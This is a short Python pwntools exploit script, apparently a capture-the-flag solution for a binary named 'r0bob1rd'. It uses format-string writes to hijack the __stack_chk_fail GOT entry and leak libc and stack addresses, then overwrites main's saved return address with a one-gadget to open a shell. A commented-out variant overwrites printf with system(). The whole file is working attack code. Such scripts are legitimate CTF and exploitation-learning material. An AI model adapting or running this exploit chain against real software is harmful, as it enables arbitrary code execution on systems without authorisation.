from pwn import *

context.binary = binary = ELF('./r0bob1rd_patched', checksec=False)
libc = ELF('glibc/libc.so.6', checksec=False)

p = process()
#p = remote('94.237.54.190', 46907)

payload1 = fmtstr_payload(8, {binary.got.__stack_chk_fail:binary.symbols.operation})
payload1 = payload1.ljust(105, b'\x90')

p.sendline(b'0')
p.sendline(payload1)

p.sendline(b'1')
p.sendline(b'LEAK|%p|%22$p|'.ljust(105, b'\x90'))

p.recvuntil(b'LEAK|')
libc_leak = int(p.recvuntil(b'|')[:-1].decode().strip(), 16)
libc.address = libc_leak - 0x1ed723
info(f'LIBC Leak: {hex(libc_leak)}')
info(f'LIBC Base: {hex(libc.address)}')

stack_leak = int(p.recvuntil(b'|')[:-1].decode().strip(), 16)
saved_rip = stack_leak + 0x28
info(f'Stack Leak: {hex(stack_leak)}')
info(f'main() saved RIP: {hex(saved_rip)}')

rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = rop.find_gadget(['ret'])[0]
system = libc.symbols.system
bin_sh = next(libc.search(b'/bin/sh\x00'))

rop_write1 = {saved_rip:pop_rdi}
rop_write2 = {saved_rip+8:bin_sh}
rop_write3 = {saved_rip+16:ret}
rop_write4 = {saved_rip+24:system}

p.clean()

# Write one gadget to saved RIP of main
p.sendline(b'0')
p.sendlineafter(b'Enter bird\'s little description\n> ', fmtstr_payload(8, {saved_rip:libc.address+0xe3b01}, write_size='short'))

# Secondary solution by overwriting printf GOT entry with system()
#
# p.sendlineafter(b'Enter bird\'s little description\n> ', fmtstr_payload(8, {binary.got.printf:libc.symbols.system}, write_size='short').ljust(105, b'\x90'))
# p.sendline(b'0')
#p.sendline(b'/bin/bash')

p.recvrepeat(3)
print('*** SHELL ***')
p.interactive()
